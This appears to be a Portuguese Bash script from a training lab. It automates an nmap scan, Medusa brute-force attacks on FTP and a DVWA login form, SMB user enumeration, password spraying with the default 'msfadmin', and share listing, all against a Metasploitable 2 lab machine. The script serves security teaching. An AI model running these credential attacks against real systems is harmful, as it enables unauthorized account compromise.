#!/bin/bash
# ==============================================================================
# Script de Automação e Demonstração - Laboratório DIO
# Simulação de Brute Force com Medusa e Kali Linux
# Alvo: Metasploitable 2 / DVWA

TARGET_IP="192.168.56.102"
USERLIST="../wordlists/users.txt"
PASSLIST="../wordlists/passwords.txt"

echo "======================================================"
echo "    LABORATÓRIO DE AUDITORIA DE SENHAS COM MEDUSA     "
echo "======================================================"
echo "IP Alvo definido: $TARGET_IP"
echo ""

# 1. Teste de Conectividade e Reconhecimento
echo "[+] Etapa 1: Verificando conectividade e portas abertas..."
nmap -sV -Pn -p 21,80,139,445 $TARGET_IP
echo ""

# 2. Cenário 1: Ataque de Força Bruta no FTP
echo "[+] Etapa 2: Iniciando teste de Brute Force no FTP com Medusa..."
medusa -h $TARGET_IP -U $USERLIST -P $PASSLIST -M ftp -f -t 4
echo ""

# 3. Cenário 2: Força Bruta em Formulário Web (DVWA)
echo "[+] Etapa 3: Executando teste em formulário Web (DVWA)..."
medusa -h $TARGET_IP -U $USERLIST -P $PASSLIST -M http -m DIR:/dvwa/vulnerabilities/brute/ -m FORM:"index.php" -f
echo ""

# 4. Cenário 3.1: Enumeração SMB
echo "[+] Etapa 4: Enumerando usuários via SMB (Enum4linux)..."
enum4linux -U $TARGET_IP
echo ""

# 5. Cenário 3.2: Password Spraying no SMB
echo "[+] Etapa 5: Executando Password Spraying no SMB com Medusa (senha: msfadmin)..."
medusa -h $TARGET_IP -U $USERLIST -p "msfadmin" -M smbnt
echo ""

# 6. Validação do Acesso SMB
echo "[+] Etapa 6: Validando compartilhamentos acessíveis com smbclient..."
smbclient -L //$TARGET_IP -U msfadmin -N
echo ""